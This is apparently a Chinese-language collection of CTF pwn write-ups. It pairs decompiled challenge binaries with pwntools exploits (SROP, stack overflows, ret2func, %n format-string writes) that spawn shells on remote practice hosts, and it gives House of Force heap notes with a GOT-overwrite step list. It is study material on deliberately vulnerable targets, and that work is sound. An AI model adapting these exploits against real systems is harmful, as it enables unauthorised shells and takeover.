<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  signed __int64 v3; // rax</span><br><span class="line">  signed __int64 v4; // rax</span><br><span class="line">  signed __int64 v5; // rax</span><br><span class="line"></span><br><span class="line">  v3 = sys_write(1u, global_pwn, 0x17uLL);</span><br><span class="line">  if ( (unsigned __int64)sys_read(0, global_buf, 0x200uLL) &gt;= 0xF8 )</span><br><span class="line">    v4 = sys_rt_sigreturn(0LL);</span><br><span class="line">  v5 = sys_exit(0);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>exp:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br><span class="line">#io = process(&#x27;./pwn&#x27;)</span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line">io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28177)</span><br><span class="line">str_bin_sh_offset = 0x100</span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = elf.symbols[&#x27;global_buf&#x27;] + str_bin_sh_offset</span><br><span class="line">frame.rsi = 0</span><br><span class="line">frame.rdx = 0</span><br><span class="line">frame.rip = elf.symbols[&#x27;syscall&#x27;]</span><br><span class="line">io.send(str(frame).ljust(str_bin_sh_offset, &#x27;a&#x27;) + &#x27;/bin/sh\x00&#x27;)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><h3 id="off-by-one-off-by-null"><a href="#off-by-one-off-by-null" class="headerlink" title="off-by-one (off-by-null)"></a>off-by-one (off-by-null)</h3><h3 id="House-Of-Force"><a href="#House-Of-Force" class="headerlink" title="House Of Force"></a>House Of Force</h3><p>利用条件<br>​ House Of Force 是一种堆利用方法，但是并不是说 House Of Force 必须得基于堆漏洞来进行利用。如果一个堆 (heap based) 漏洞想要通过 House Of Force 方法进行利用，需要以下条件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">能够以溢出等方式控制到 top chunk 的 size 域</span><br><span class="line">能够自由地控制堆分配尺寸的大小</span><br></pre></td></tr></table></figure>

<p>​ House Of Force 产生的原因在于 glibc 对 top chunk 的处理，根据前面堆数据结构部分的知识我们得知，进行堆分配时，如果所有空闲的块都无法满足需求，那么就会从 top chunk 中分割出相应的大小作为堆块的空间。</p>
<p>适用libc版本:2.23 2.27</p>
<p>使用前提:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1、申请堆块的大小不受限制</span><br><span class="line"></span><br><span class="line">2、能够篡改top chunk的size位(主要是通过溢出的手段)</span><br><span class="line"></span><br><span class="line">3、有top chunk原本的地址(这一条在特殊情况下，可以不具备)</span><br><span class="line"></span><br><span class="line">4、有将top chunk更新后的目的地址(这一条在特殊情况下，可以不具备)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>PS：特殊情况为：我们只需要top chunk的地址更新到堆区，这样我们只需要知道top chunk和目的地址二者的偏移即可。(因为本身其实算request_size的时候要的就是二者偏移)(相关题目可以看hitcontraining_bamboobox)</p>
<p>攻击效果：可以将top chunk更新到任意已知地址，再将新的堆块从top chunk中申请出来写入数据。就可以达到任意地址任意写的目的。</p>
<p>防御措施：对top chunk的size位进行检查，判断是否合法</p>
<p>house of force不需要保证top chunk的size域是合法的，但是house of orange需要保证size域合法，因为后一种利用方式会把top chunk放在unsorted bin，会有chunk size的检查。</p>
<p>house of force一般需要泄露出heap地址，并且需要能改写top chunk的size域，还要能分配任意大小的内存，总的来说，条件还是很多的。可以直接分配到got表附近，但是这样会破坏一些got表的内容，也可分配到堆指针数组，一般在bss或者data段。</p>
<p>strcpy会一直拷贝源字符串，直到遇到\x0a或者\x00字符。并且在拷贝结束后，尾部添加一个\x00字符，很多off by one的题目就是基于此。</p>
<h4 id="bcloud-bctf-2016"><a href="#bcloud-bctf-2016" class="headerlink" title="bcloud_bctf_2016"></a>bcloud_bctf_2016</h4><h5 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h5><p>1：get_name泄露堆地址<br>2：get_org_host修改top chunk的size域</p>
<h5 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h5><p>本题主要使用House of Force Attack，注意，这个攻击方法在2.23、2.27版本的libc是奏效的，在libc-2.29.so加了top chunk的size域合法性的校验。<br>计算大小的时候，可以就直接给malloc传一个负数，会自动转化为正整数的。<br>可以在调试过程中确定要分配的那个大小，计算得到的size可能会有一些偏移。</p>
<h5 id="利用步骤："><a href="#利用步骤：" class="headerlink" title="利用步骤："></a>利用步骤：</h5><p>在get_name接口中，输入0x40 * ‘a’，泄露出堆地址<br>通过get_org_host覆盖top chunk的size，修改为0xffffffff。<br>利用house of force分配到ptr_array，即地址为0x0x804b120。<br>连续分配4个用户大小为0x44大小的chunk A、B、C、D。那么，编辑chunk A的时候，就能直接修改ptr_array数组元素的地址。引用与参考[2]。<br>调用edit_note，编辑chunk A，将ptr_array[2]设置为free@got，将ptr_array[3]设置为printf@got。<br>调用edit_note，编辑ptr_array[2]的内容为puts@plt，就是将free@got修改为了puts@plt地址。<br>调用del_note，去释放ptr_array[3]，实际上调用的是puts打印出来了printf的地址。<br>再次调用edit_note，编辑chunk A，将ptr_array[0]设置为0x804b130，ptr_array[2]设置为free@got，将ptr_array[4]写为&#x2F;bin&#x2F;sh<br>调用edit_note，将free@got修改为了system地址<br>调用del_note，释放ptr_array[0]，即可getshell</p>
<h1 id="newstar"><a href="#newstar" class="headerlink" title="newstar"></a>newstar</h1><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test_your_nc"></a>test_your_nc</h2><p>nc连接，ls,cat flag,获得flag</p>
<h2 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h2><p>checksec一下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX unknown - GNU_STACK missing</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">Stack:    Executable</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
<p>ida打开直接做：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char s[15]; // [rsp+1h] [rbp-Fh] BYREF</span><br><span class="line"></span><br><span class="line">  puts(&quot;please input&quot;);</span><br><span class="line">  gets(s, argv);</span><br><span class="line">  puts(s);</span><br><span class="line">  puts(&quot;ok,bye!!!&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line">int fun()</span><br><span class="line">&#123;</span><br><span class="line">  return system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>exp:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br><span class="line">ip=&quot;node4.buuoj.cn&quot;</span><br><span class="line">port=29431</span><br><span class="line"></span><br><span class="line">#io=process(&#x27;./pwn1&#x27;)</span><br><span class="line">io=remote(ip,port)</span><br><span class="line">fun_addr=0x401186</span><br><span class="line">payload=b&#x27;a&#x27;*15+p64(fun_addr)</span><br><span class="line">#io.recvline()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>


<h2 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h2><p>checksec:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX unknown - GNU_STACK missing</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">Stack:    Executable</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
<p>ida:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(int a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  char s[64]; // [rsp+0h] [rbp-80h] BYREF</span><br><span class="line">  char v5[64]; // [rsp+40h] [rbp-40h] BYREF</span><br><span class="line"></span><br><span class="line">  write(1, &quot;-Warm Up-\n&quot;, 0xAuLL);</span><br><span class="line">  write(1, &quot;WOW:&quot;, 4uLL);</span><br><span class="line">  sprintf(s, &quot;%p\n&quot;, sub_40060D);</span><br><span class="line">  write(1, s, 9uLL);</span><br><span class="line">  write(1, &quot;&gt;&quot;, 1uLL);</span><br><span class="line">  return gets(v5);</span><br><span class="line">&#125;</span><br><span class="line">int sub_40060D()</span><br><span class="line">&#123;</span><br><span class="line">  return system(&quot;cat flag.txt&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>exp:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br><span class="line">ip=&quot;node4.buuoj.cn&quot;</span><br><span class="line">port=27420</span><br><span class="line"></span><br><span class="line">#io=process(&#x27;./warm&#x27;)</span><br><span class="line">io=remote(ip,port)</span><br><span class="line">fun=0x400611</span><br><span class="line">payload=b&#x27;a&#x27;*(0x40+8)+p64(fun)</span><br><span class="line">io.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h2><p>checksec:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<p>ida:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(_bss_start, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(stdin, 0LL, 2, 0LL);</span><br><span class="line">  func();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line">int func()</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax</span><br><span class="line">  char v1[44]; // [rsp+0h] [rbp-30h] BYREF</span><br><span class="line">  float v2; // [rsp+2Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  v2 = 0.0;</span><br><span class="line">  puts(&quot;Let&#x27;s guess the number.&quot;);</span><br><span class="line">  gets(v1);</span><br><span class="line">  if ( v2 == 11.28125 )</span><br><span class="line">    result = system(&quot;cat /flag&quot;);</span><br><span class="line">  else</span><br><span class="line">    result = puts(&quot;Its value should be 11.28125&quot;);</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>程序显示v2&#x3D;11.28125时运行system(“cat .&#x2F;flag.txt”)<br>exp:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br><span class="line">ip=&quot;node4.buuoj.cn&quot;</span><br><span class="line">port=29058</span><br><span class="line"></span><br><span class="line">#io=process(&#x27;./warm&#x27;)</span><br><span class="line">io=remote(ip,port)</span><br><span class="line">num=11.28125</span><br><span class="line"></span><br><span class="line">payload=b&#x27;a&#x27;*(0x30-0x4)+p64(0x41348000)</span><br><span class="line">io.recvline()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>直接用垃圾数据覆盖过去直接调用system(“cat .&#x2F;flag.txt”)<br>exp:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br><span class="line">ip=&quot;node4.buuoj.cn&quot;</span><br><span class="line">port=29058</span><br><span class="line"></span><br><span class="line">#io=process(&#x27;./warm&#x27;)</span><br><span class="line">io=remote(ip,port)</span><br><span class="line">system=0x4006BE</span><br><span class="line"></span><br><span class="line">payload=b&#x27;a&#x27;*(0x30+0x8)+p64(system)</span><br><span class="line">io.recvline()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h2><p>checksec,开启nx保护，堆栈不可执行:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>ida:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  vuln();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line">int vuln()</span><br><span class="line">&#123;</span><br><span class="line">  const char *v0; // eax</span><br><span class="line">  char s[32]; // [esp+1Ch] [ebp-3Ch] BYREF</span><br><span class="line">  char v3[4]; // [esp+3Ch] [ebp-1Ch] BYREF</span><br><span class="line">  char v4[7]; // [esp+40h] [ebp-18h] BYREF</span><br><span class="line">  char v5; // [esp+47h] [ebp-11h] BYREF</span><br><span class="line">  char v6[7]; // [esp+48h] [ebp-10h] BYREF</span><br><span class="line">  char v7[5]; // [esp+4Fh] [ebp-9h] BYREF</span><br><span class="line"></span><br><span class="line">  printf(&quot;Tell me something about yourself: &quot;);</span><br><span class="line">  fgets(s, 32, edata);</span><br><span class="line">  std::string::operator=(&amp;input, s);</span><br><span class="line">  std::allocator&lt;char&gt;::allocator(&amp;v5);</span><br><span class="line">  std::string::string(v4, &quot;you&quot;, &amp;v5);</span><br><span class="line">  std::allocator&lt;char&gt;::allocator(v7);</span><br><span class="line">  std::string::string(v6, &quot;I&quot;, v7);</span><br><span class="line">  replace((std::string *)v3);</span><br><span class="line">  std::string::operator=(&amp;input, v3, v6, v4);</span><br><span class="line">  std::string::~string(v3);</span><br><span class="line">  std::string::~string(v6);</span><br><span class="line">  std::allocator&lt;char&gt;::~allocator(v7);</span><br><span class="line">  std::string::~string(v4);</span><br><span class="line">  std::allocator&lt;char&gt;::~allocator(&amp;v5);</span><br><span class="line">  v0 = (const char *)std::string::c_str((std::string *)&amp;input);</span><br><span class="line">  strcpy(s, v0);</span><br><span class="line">  return printf(&quot;So, %s\n&quot;, s);</span><br><span class="line">&#125;</span><br><span class="line">int get_flag()</span><br><span class="line">&#123;</span><br><span class="line">  return system(&quot;cat flag.txt&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现程序会把I换成you,利用这个构造溢出点。<br>exp:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br><span class="line">ip=&quot;node4.buuoj.cn&quot;</span><br><span class="line">port=26450</span><br><span class="line"></span><br><span class="line">#io=process(&#x27;./pwn1_sctf_2016&#x27;)</span><br><span class="line">io=remote(ip,port)</span><br><span class="line"></span><br><span class="line">system=0x8048F13</span><br><span class="line"></span><br><span class="line">payload=b&#x27;I&#x27;*(20)+b&#x27;a&#x27;*4+p32(system)</span><br><span class="line"></span><br><span class="line">#io.recv()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a>jarvisoj_level0</h2><p>checksec:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<p>ida:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  write(1, &quot;Hello, World\n&quot;, 0xDuLL);</span><br><span class="line">  return vulnerable_function();</span><br><span class="line">&#125;</span><br><span class="line">ssize_t vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  char buf[128]; // [rsp+0h] [rbp-80h] BYREF</span><br><span class="line"></span><br><span class="line">  return read(0, buf, 0x200uLL);</span><br><span class="line">&#125;</span><br><span class="line">int callsystem()</span><br><span class="line">&#123;</span><br><span class="line">  return system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>简单<br>exp:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br><span class="line">ip=&quot;node4.buuoj.cn&quot;</span><br><span class="line">port=25249</span><br><span class="line"></span><br><span class="line">#io=process(&#x27;./pwn1_sctf_2016&#x27;)</span><br><span class="line">io=remote(ip,port)</span><br><span class="line"></span><br><span class="line">system=0x40059A</span><br><span class="line"></span><br><span class="line">payload=b&#x27;a&#x27;*0x80+b&#x27;a&#x27;*0x8+p64(system)</span><br><span class="line">io.recvline()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="第五空间2019-决赛-PWN5"><a href="#第五空间2019-决赛-PWN5" class="headerlink" title="[第五空间2019 决赛]PWN5"></a>[第五空间2019 决赛]PWN5</h2><p>checksec,开了canary和nx保护:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>1.利用 “AAAA %08x %08x %8x %08x %08x %08x %08x………… “,这样的字符串来找到我们输入的参数在函数栈上的位置，我看别的师傅叫首地址偏移或者偏移量</p>
<p>2.假设是在栈上第n位，那么可以利用 %n$ 定位到参数在栈上的位置</p>
<p>3.利用%n来修改参数里的内容，我们不知道读入的随机数是多少，那么我们将它改成我们写入的数据不就好了<br>ida：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v1; // eax</span><br><span class="line">  int result; // eax</span><br><span class="line">  int fd; // [esp+0h] [ebp-84h]</span><br><span class="line">  char nptr[16]; // [esp+4h] [ebp-80h] BYREF</span><br><span class="line">  char buf[100]; // [esp+14h] [ebp-70h] BYREF</span><br><span class="line">  unsigned int v6; // [esp+78h] [ebp-Ch]</span><br><span class="line">  int *v7; // [esp+7Ch] [ebp-8h]</span><br><span class="line"></span><br><span class="line">  v7 = &amp;a1;</span><br><span class="line">  v6 = __readgsdword(0x14u);</span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  v1 = time(0);</span><br><span class="line">  srand(v1);</span><br><span class="line">  fd = open(&quot;/dev/urandom&quot;, 0);</span><br><span class="line">  read(fd, &amp;dword_804C044, 4u);</span><br><span class="line">  printf(&quot;your name:&quot;);</span><br><span class="line">  read(0, buf, 0x63u);</span><br><span class="line">  printf(&quot;Hello,&quot;);</span><br><span class="line">  printf(buf);</span><br><span class="line">  printf(&quot;your passwd:&quot;);</span><br><span class="line">  read(0, nptr, 0xFu);</span><br><span class="line">  if ( atoi(nptr) == dword_804C044 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;ok!!&quot;);</span><br><span class="line">    system(&quot;/bin/sh&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;fail&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  result = 0;</span><br><span class="line">  if ( __readgsdword(0x14u) != v6 )</span><br><span class="line">    sub_80493D0();</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>exp1:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">## remote()建立远程连接,指明ip和port</span><br><span class="line">io = remote(&#x27;node4.buuoj.cn&#x27;, 28198)</span><br><span class="line">leak_addr = 0x804C044</span><br><span class="line">io.recvuntil(&#x27;your name:&#x27;)</span><br><span class="line">payload1 = p32(leak_addr) + b&#x27;%10$n&#x27;</span><br><span class="line">io.sendline(payload1)#发送数据</span><br><span class="line">io.recvuntil(&#x27;your passwd:&#x27;) #与shell进行交互</span><br><span class="line">io.sendline(b&#x27;4&#x27;)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>exp2:</p>
